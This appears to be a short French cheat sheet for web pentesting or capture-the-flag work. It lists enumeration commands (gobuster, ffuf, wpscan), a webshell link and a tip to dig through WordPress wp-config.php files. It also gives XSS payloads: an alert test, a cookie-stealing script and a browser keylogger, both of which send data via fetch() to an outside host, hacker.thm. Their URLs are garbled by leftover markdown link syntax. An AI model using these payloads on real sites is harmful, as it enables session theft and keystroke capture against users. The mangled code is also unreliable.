directory enumération :

gobuster dir -w <WORDLIST> -u <URL>

ou :

dirbuster <completer la GUI>

Sous domaine énumération:

ffuf -w <WORDLIST> -H "Host: FUZZ.<URL>" -u <URL>

quelques payload pour injection XSS :

vérification de l'existance afficher une pop up :

<script>alert('XSS');</script>

vol de cookie de connexion :

<script>fetch('[http://monsite.com'](https://hacker.thm/steal?cookie=') + btoa(document.cookie));</script>

key loggeur dans le navigateur :

<script>document.onkeypress = function(e) { fetch('[http://site.com'](https://hacker.thm/log?key=') + btoa(e.key) );}</script>

Wpscan très bonne outils pour les sites wordpress : 
	wpscan --url http://<IP> -e vp,vt,u


Penser a un WEBSHELL :
	https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985

fouiller les fichier de configuration sur wordpress (wp-config.php)
